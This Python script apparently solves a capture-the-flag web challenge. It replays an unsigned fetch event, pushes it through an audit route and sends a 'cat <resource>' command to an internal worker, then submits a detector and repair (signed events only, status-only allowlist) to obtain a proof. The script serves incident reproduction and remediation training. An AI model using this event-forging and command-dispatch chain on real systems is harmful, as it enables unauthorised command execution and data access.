#!/usr/bin/env python3
"""Reproduce and remediate the assigned fetch-to-worker incident target."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import HTTPRedirectHandler, Request, build_opener

from inspect_target import normalize_url, origin


MAX_BODY_BYTES = 2 * 1024 * 1024
USER_AGENT = "HuntressCTF-Web-Solver/1.0"
PROOF_RE = re.compile(r"proof_[A-Za-z0-9_-]{12,}\Z")


class NoRedirects(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # type: ignore[no-untyped-def]
        return None


class Solver:
    def __init__(self, target: str, output_dir: Path):
        self.target = normalize_url(target)
        self.allowed_origin = origin(self.target)
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.opener = build_opener(NoRedirects)
        self.responses: list[dict[str, object]] = []

    def request(
        self,
        route: str,
        *,
        method: str = "GET",
        params: dict[str, str] | None = None,
        payload: dict | None = None,
    ) -> tuple[int, dict[str, str], bytes]:
        url = normalize_url(urljoin(self.target, route))
        if origin(url) != self.allowed_origin:
            raise ValueError(f"refusing off-target route: {route}")
        if params:
            parts = urlsplit(url)
            query = urlencode(params)
            url = urlunsplit(
                (parts.scheme, parts.netloc, parts.path, f"{parts.query}&{query}" if parts.query else query, "")
            )
        body = json.dumps(payload, separators=(",", ":")).encode() if payload is not None else None
        headers = {"User-Agent": USER_AGENT, "Accept": "application/json, */*;q=0.5"}
        if body is not None:
            headers["Content-Type"] = "application/json"
        request = Request(url, data=body, headers=headers, method=method)
        try:
            response = self.opener.open(request, timeout=15)
        except HTTPError as exc:
            response = exc
        except URLError as exc:
            raise RuntimeError(f"request failed for {route}: {exc.reason}") from exc
        response_body = response.read(MAX_BODY_BYTES + 1)
        if len(response_body) > MAX_BODY_BYTES:
            raise RuntimeError(f"{route} exceeded the 2 MiB response limit")
        status = int(getattr(response, "status", response.code))
        response_headers = {key.lower(): value for key, value in response.headers.items()}
        filename = f"{len(self.responses) + 1:02d}-{urlsplit(url).path.strip('/').replace('/', '_') or 'root'}.body"
        (self.output_dir / filename).write_bytes(response_body)
        self.responses.append(
            {
                "file": filename,
                "url": url,
                "method": method,
                "status": status,
                "bytes": len(response_body),
                "sha256": hashlib.sha256(response_body).hexdigest(),
            }
        )
        return status, response_headers, response_body

    @staticmethod
    def parse_json(body: bytes, description: str, status: int) -> dict:
        try:
            value = json.loads(body.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as exc:
            raise RuntimeError(f"{description} returned invalid JSON (HTTP {status})") from exc
        if not isinstance(value, dict):
            raise RuntimeError(f"{description} returned a non-object JSON value")
        return value

    def get_json(self, route: str, description: str, *, params: dict[str, str] | None = None) -> dict:
        status, _, body = self.request(route, params=params)
        value = self.parse_json(body, description, status)
        if status != 200:
            raise RuntimeError(f"{description} returned HTTP {status}: {value}")
        return value

    def clues(self) -> dict:
        clues = self.get_json("/api/clues", "/api/clues")
        required = (
            "request_log_route",
            "evidence_route",
            "feature_route",
            "secondary_route",
            "final_route",
            "response_route",
            "fetch_query_field",
            "worker_query_field",
            "event_json_field",
        )
        missing = [field for field in required if not isinstance(clues.get(field), str) or not clues[field]]
        if missing:
            raise ValueError(f"route inventory is missing required fields: {missing}")
        return clues

    def solve(self, clues: dict) -> tuple[str, dict]:
        request_log = self.get_json(clues["request_log_route"], clues["request_log_route"])
        records = request_log.get("records")
        if not isinstance(records, list):
            raise ValueError("request log does not contain a records list")
        candidates = [
            record
            for record in records
            if isinstance(record, dict)
            and record.get("kind") == "fetch"
            and record.get("outcome") == "queued"
            and record.get("signed") is False
            and isinstance(record.get("target"), str)
        ]
        if not candidates:
            raise ValueError("request log has no queued unsigned fetch to reproduce")
        event = candidates[-1]
        token = event["target"]

        status, _, body = self.request(
            clues["feature_route"],
            params={clues["fetch_query_field"]: token},
        )
        fetch_result = self.parse_json(body, clues["feature_route"], status)
        if status != 202 or fetch_result.get("stage") != "fetch_event_created":
            raise RuntimeError(f"fetch did not create the disclosed incident event: HTTP {status} {fetch_result}")

        status, _, body = self.request(
            clues["secondary_route"],
            method="POST",
            payload={clues["event_json_field"]: token},
        )
        dispatch = self.parse_json(body, clues["secondary_route"], status)
        if status not in (200, 202) or dispatch.get("ok") is not True:
            raise RuntimeError(f"audit route did not verify the event: HTTP {status} {dispatch}")
        worker_route = dispatch.get("worker_route", clues["final_route"])
        if not isinstance(worker_route, str):
            raise ValueError("audit response did not disclose a worker route")
        commands = dispatch.get("available_commands")
        resources = dispatch.get("resources")
        if not isinstance(commands, list) or "status" not in commands:
            raise ValueError("audit response did not preserve the signed status command")
        if not isinstance(resources, list) or "objective" not in resources:
            raise ValueError("audit response did not disclose the objective resource")

        cat_templates = [
            command
            for command in commands
            if isinstance(command, str) and command.startswith("cat ") and "<resource>" in command
        ]
        if not cat_templates:
            raise ValueError("audit response did not disclose a resource-read command")
        resource = next(
            (item for item in resources if isinstance(item, str) and item),
            None,
        )
        if resource is None:
            raise ValueError("audit response did not disclose a readable resource")
        worker_command = f"cat {resource}"
        status, _, body = self.request(
            worker_route,
            params={clues["worker_query_field"]: worker_command},
        )
        worker_result = self.parse_json(body, worker_route, status)
        if status != 202 or worker_result.get("stage") != "unsigned_worker_dispatched":
            raise RuntimeError(f"worker did not reproduce the unsigned dispatch: HTTP {status} {worker_result}")

        evidence = self.get_json(clues["evidence_route"], clues["evidence_route"])
        schema = evidence.get("response_schema")
        regression_goal = evidence.get("regression_goal")
        if not isinstance(schema, dict) or not isinstance(regression_goal, str):
            raise ValueError("evidence does not disclose the repair schema and regression goal")
        if not all(
            phrase in regression_goal.lower()
            for phrase in ("unsigned", "internal fetch", "status")
        ):
            raise ValueError(f"unexpected regression goal: {regression_goal}")
        detector_schema = schema.get("detector")
        repair_schema = schema.get("repair")
        if not isinstance(detector_schema, dict) or not isinstance(repair_schema, dict):
            raise ValueError("response schema does not describe detector and repair objects")

        events = evidence.get("events")
        if not isinstance(events, list):
            raise ValueError("evidence does not contain the reproduced events")
        unsigned_dispatch = next(
            (
                item
                for item in events
                if isinstance(item, dict)
                and item.get("kind") == "worker.dispatch"
                and item.get("signed") is False
            ),
            None,
        )
        if unsigned_dispatch is None:
            raise ValueError("evidence does not identify an unsigned worker dispatch")
        status_allowlist = [
            command for command in commands if isinstance(command, str) and command == "status"
        ]
        if not status_allowlist:
            raise ValueError("no signed status command is available to preserve")
        response = {
            "detector": {
                "kind": unsigned_dispatch["kind"],
                "signed": unsigned_dispatch["signed"],
            },
            "repair": {
                "block_internal_fetch": True,
                "require_signed_event": True,
                "worker_allowlist": status_allowlist,
            },
        }
        status, _, body = self.request(
            clues["response_route"],
            method="POST",
            payload=response,
        )
        result = self.parse_json(body, clues["response_route"], status)
        proof = result.get("evidence")
        if status != 200 or result.get("ok") is not True or not isinstance(proof, str) or not PROOF_RE.fullmatch(proof):
            raise RuntimeError(f"remediation did not return a proof: HTTP {status} {result}")

        details = {
            "event": event,
            "fetch_result": fetch_result,
            "worker_dispatch": dispatch,
            "worker_result": worker_result,
            "worker_command": worker_command,
            "regression_goal": regression_goal,
            "repair": response,
            "remediation_result": result,
        }
        return proof, details

    def save_report(self, clues: dict, proof: str, details: dict) -> Path:
        report = {
            "target": self.target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "clues": clues,
            **details,
            "proof": proof,
            "responses": self.responses,
            "request_policy": {
                "same_origin_only": True,
                "max_response_bytes": MAX_BODY_BYTES,
                "event_token_source": "queued unsigned fetch in the assigned request log",
                "no_identifier_enumeration": True,
            },
        }
        path = self.output_dir / "report.json"
        path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
        return path


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", help="exact target URL from the current attempt")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()
    try:
        target = normalize_url(args.target)
        hostname = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{hostname}-full-stack-incident-{timestamp}"
        )
        solver = Solver(target, output_dir)
        clues = solver.clues()
        proof, details = solver.solve(clues)
        report = solver.save_report(clues, proof, details)
        print(json.dumps({"proof": proof, "report": str(report)}, indent=2))
        return 0
    except (OSError, RuntimeError, ValueError) as exc:
        print(json.dumps({"error": str(exc)}))
        return 1


if __name__ == "__main__":
    sys.exit(main())
